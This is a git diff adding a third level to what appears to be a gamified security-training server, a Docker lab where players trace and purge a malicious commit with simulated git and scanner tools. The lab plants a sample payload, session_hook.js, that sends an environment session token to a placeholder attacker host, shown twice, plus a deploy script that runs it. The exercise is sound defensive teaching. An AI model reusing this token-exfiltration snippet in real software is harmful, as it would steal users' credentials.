@@ -71,9 +71,46 @@ io.on('connection', (socket) => {
   console.log(`[Socket] Player connected: ${socket.id}`);
   
   let ptyProcess = null;
+  let activeLevelId = null;
+  const level3State = {
+    currentCommit: 'main',
+    historyClean: false,
+    scanCount: 0,
+  };
+
+  const emitLevel3Scan = () => {
+    level3State.scanCount += 1;
+
+    const lines = [
+      '',
+      'DCIB Repository Scan',
+      'Target: payment-gateway',
+      '',
+    ];
+
+    if (level3State.historyClean) {
+      lines.push('No threats detected.', 'Historical payload index: clean');
+    } else if (level3State.currentCommit === 'a17c9e4') {
+      lines.push(
+        'Threat detected',
+        'File: payloads/session_hook.js',
+        'Signature: credential siphon / token exfiltration',
+        '__L3_THREAT_DETECTED__',
+      );
+    } else {
+      lines.push('No threats detected', 'Current working tree appears clean.');
+
+      if (level3State.scanCount === 1) {
+        lines.push('__L3_SCAN_CLEAN__');
+      }
+    }
+
+    socket.emit('terminal_output', `${lines.join('\r\n')}\r\n`);
+  };
 
   socket.on('start_lab', (data) => {
     console.log(`[Socket] Starting lab for ${socket.id} - Level: ${data.levelId}`);
+    activeLevelId = data.levelId;
     
     let dockerCmd = ['run', '-it', '--rm'];
     
@@ -195,17 +232,239 @@ io.on('connection', (socket) => {
         exec bash --init-file /root/.bashrc
       `;
       dockerCmd.push('ubuntu:22.04', 'bash', '-c', setupScript);
+    } else if (data.levelId === 'level_3') {
+      const setupScript = `
+        mkdir -p /workspace/payment-gateway/scripts
+        mkdir -p /workspace/payment-gateway/src
+        mkdir -p /opt/dcib-state
+
+        echo main > /opt/dcib-state/current_commit
+        echo 0 > /opt/dcib-state/history_clean
+        echo 0 > /opt/dcib-state/reverted
+        echo 0 > /opt/dcib-state/scan_count
+
+        cat > /workspace/payment-gateway/README.md <<'EOF'
+# payment-gateway
+
+DCIB mirror of the payment gateway service.
+Current branch scans clean, but deployment behavior suggests an older payload may be reachable.
+EOF
+
+        cat > /workspace/payment-gateway/src/server.js <<'EOF'
+function healthcheck() {
+  return "ok";
+}
+
+module.exports = { healthcheck };
+EOF
+
+        cat > /workspace/payment-gateway/scripts/deploy-preview.sh <<'EOF'
+#!/bin/bash
+echo "Preparing preview deploy..."
+git checkout a17c9e4 -- payloads/session_hook.js
+node payloads/session_hook.js --preview
+EOF
+        chmod +x /workspace/payment-gateway/scripts/deploy-preview.sh
+
+        cat > /usr/local/bin/dcib-scan <<'EOF'
+#!/bin/bash
+current="$(cat /opt/dcib-state/current_commit)"
+history_clean="$(cat /opt/dcib-state/history_clean)"
+scan_count="$(cat /opt/dcib-state/scan_count)"
+scan_count=$((scan_count + 1))
+echo "$scan_count" > /opt/dcib-state/scan_count
+
+echo "DCIB Repository Scan"
+echo "Target: payment-gateway"
+echo ""
+
+if [ "$history_clean" = "1" ]; then
+  echo "No threats detected."
+  echo "Historical payload index: clean"
+  exit 0
+fi
+
+if [ "$current" = "a17c9e4" ]; then
+  echo "Threat detected"
+  echo "File: payloads/session_hook.js"
+  echo "Signature: credential siphon / token exfiltration"
+  echo "__L3_THREAT_DETECTED__"
+  exit 0
+fi
+
+echo "No threats detected"
+echo "Current working tree appears clean."
+if [ "$scan_count" = "1" ]; then
+  echo "__L3_SCAN_CLEAN__"
+fi
+EOF
+        chmod +x /usr/local/bin/dcib-scan
+
+        cat > /usr/local/bin/git <<'EOF'
+#!/bin/bash
+cmd="$1"
+shift || true
+
+case "$cmd" in
+  status)
+    current="$(cat /opt/dcib-state/current_commit)"
+    echo "On branch main"
+    if [ "$current" = "a17c9e4" ]; then
+      echo "HEAD detached at a17c9e4"
+    fi
+    echo "nothing to commit, working tree clean"
+    ;;
+  grep)
+    pattern="$*"
+    if echo "$pattern" | grep -q "git checkout"; then
+      echo "scripts/deploy-preview.sh:git checkout a17c9e4 -- payloads/session_hook.js"
+      echo "__L3_FOUND_FILE__"
+    else
+      echo ""
+    fi
+    ;;
+  checkout)
+    if [ "$1" = "a17c9e4" ]; then
+      echo a17c9e4 > /opt/dcib-state/current_commit
+      mkdir -p /workspace/payment-gateway/payloads
+      cat > /workspace/payment-gateway/payloads/session_hook.js <<'PAYLOAD'
+const token = process.env.PAYMENT_SESSION_TOKEN;
+fetch("https://shadow-sync.invalid/collect", {
+  method: "POST",
+  body: JSON.stringify({ token })
+});
+PAYLOAD
+      echo "Note: switching to 'a17c9e4'."
+      echo "Historical file restored: payloads/session_hook.js"
+      echo "__L3_CHECKED_OUT_BAD_COMMIT__"
+    elif [ "$1" = "main" ]; then
+      echo main > /opt/dcib-state/current_commit
+      echo "Switched to branch 'main'"
+    else
+      echo "error: pathspec '$1' did not match any known commit"
+    fi
+    ;;
+  log)
+    cat <<'LOG'
+commit f2d4c91 HEAD -> main
+Author: Mira Chen <mira@dcib.local>
+Date:   Tue Mar 03 09:17:42 2026 +0000
+
+    remove obsolete preview payload
+
+commit a17c9e4
+Author: Jia Tan <jiatan@chaos.invalid>
+Date:   Tue Mar 03 08:55:10 2026 +0000
+
+    add temporary session hook for preview deploy
+
+commit 8c4b210
+Author: Priya Shah <priya@dcib.local>
+Date:   Mon Mar 02 16:18:33 2026 +0000
+
+    harden payment gateway healthcheck
+LOG
+    echo "__L3_ATTACKER_IDENTIFIED__"
+    ;;
+  show)
+    if [ "$1" = "a17c9e4" ]; then
+      cat <<'SHOW'
+commit a17c9e4
+Author: Jia Tan <jiatan@chaos.invalid>
+Date:   Tue Mar 03 08:55:10 2026 +0000
+
+    add temporary session hook for preview deploy
+
+diff --git a/payloads/session_hook.js b/payloads/session_hook.js
++const token = process.env.PAYMENT_SESSION_TOKEN;
++fetch("https://shadow-sync.invalid/collect", {
++  method: "POST",
++  body: JSON.stringify({ token })
++});
+SHOW
+      echo "__L3_ATTACKER_IDENTIFIED__"
+    else
+      echo "fatal: ambiguous argument '$1': unknown revision"
+    fi
+    ;;
+  revert)
+    if [ "$1" = "a17c9e4" ]; then
+      echo 1 > /opt/dcib-state/reverted
+      echo main > /opt/dcib-state/current_commit
+      rm -rf /workspace/payment-gateway/payloads
+      echo "[main 74e2a1c] Revert malicious session hook"
+      echo " 1 file changed, 4 deletions(-)"
+      echo "Partial cleanup complete. Historical commit remains reachable."
+      echo "__L3_REVERTED_PARTIAL__"
+    else
+      echo "error: commit '$1' is not in this training repository"
+    fi
+    ;;
+  rebase)
+    if [ "$1" = "-i" ]; then
+      reverted="$(cat /opt/dcib-state/reverted)"
+      if [ "$reverted" = "1" ]; then
+        echo 1 > /opt/dcib-state/history_clean
+        echo main > /opt/dcib-state/current_commit
+        sed -i '/git checkout a17c9e4/d' /workspace/payment-gateway/scripts/deploy-preview.sh
+        sed -i '/session_hook/d' /workspace/payment-gateway/scripts/deploy-preview.sh
+        echo "Successfully rebased and updated refs/heads/main."
+        echo "Dropped commit a17c9e4 from reachable project history."
+        echo "__L3_HISTORY_CLEANED__"
+      else
+        echo "Interactive rebase prepared, but DCIB policy requires reverting the active payload first."
+      fi
+    else
+      echo "This lab only supports: git rebase -i"
+    fi
+    ;;
+  *)
+    echo "git training shell supports: status, grep, checkout, log, show, revert, rebase -i"
+    ;;
+esac
+EOF
+        chmod +x /usr/local/bin/git
+
+        echo "export PATH=/usr/local/bin:\\$PATH" > /root/.bashrc
+        echo "export PS1='\\[\\033[32m\\]agent@DCIB MINGW64\\[\\033[0m\\] \\[\\033[33m\\]/workspace/payment-gateway (main)\\[\\033[0m\\]\\n\\$ '" >> /root/.bashrc
+        cd /workspace/payment-gateway
+        clear
+        echo "--------------------------------------------------"
+        echo "DCIB CASE 002: GIT TIME MACHINE ATTACK"
+        echo "--------------------------------------------------"
+        echo "Current repository mirror loaded."
+        echo "Use the page controls or terminal commands to investigate."
+        echo ""
+        echo "Suggested start: click Run DCIB Scan."
+        echo "--------------------------------------------------"
+        echo "__L3_LAB_READY__"
+        exec bash --init-file /root/.bashrc
+      `;
+      dockerCmd.push('ubuntu:22.04', 'bash', '-c', setupScript);
     } else {
       dockerCmd.push('ubuntu:22.04', '/bin/bash');
     }
 
-    ptyProcess = pty.spawn('docker', dockerCmd, {
-      name: 'xterm-color',
-      cols: data.cols || 80,
-      rows: data.rows || 24,
-      cwd: process.env.HOME,
-      env: process.env
-    });
+    try {
+      ptyProcess = pty.spawn('docker', dockerCmd, {
+        name: 'xterm-color',
+        cols: data.cols || 80,
+        rows: data.rows || 24,
+        cwd: process.env.HOME,
+        env: process.env
+      });
+    } catch (err) {
+      console.error(`[Socket] Failed to start lab container: ${err.message}`);
+      socket.emit('terminal_output', `\r\n[System] Failed to start Docker lab: ${err.message}\r\n`);
+      if (data.levelId === 'level_3') {
+        socket.emit('lab_ready');
+      }
+      return;
+    }
+
+    if (data.levelId === 'level_3') {
+      socket.emit('lab_ready');
+    }
 
     ptyProcess.onData((data) => {
       socket.emit('terminal_output', data);
@@ -221,6 +480,30 @@ io.on('connection', (socket) => {
     if (ptyProcess) {
       ptyProcess.write(data);
     }
+  });
+
+  socket.on('run_lab_command', (data) => {
+    const command = data && data.command;
+
+    if (activeLevelId !== 'level_3') {
+      socket.emit('terminal_output', '\r\n[System] Git lab is not ready yet.\r\n');
+      return;
+    }
+
+    if (command === 'dcib-scan') {
+      if (data.currentCommit === 'a17c9e4' || data.currentCommit === 'main') {
+        level3State.currentCommit = data.currentCommit;
+      }
+
+      if (typeof data.historyClean === 'boolean') {
+        level3State.historyClean = data.historyClean;
+      }
+
+      emitLevel3Scan();
+      return;
+    }
+
+    socket.emit('terminal_output', '\r\n[System] Unsupported lab command.\r\n');
   });
   
   socket.on('terminal_resize', (data) => {
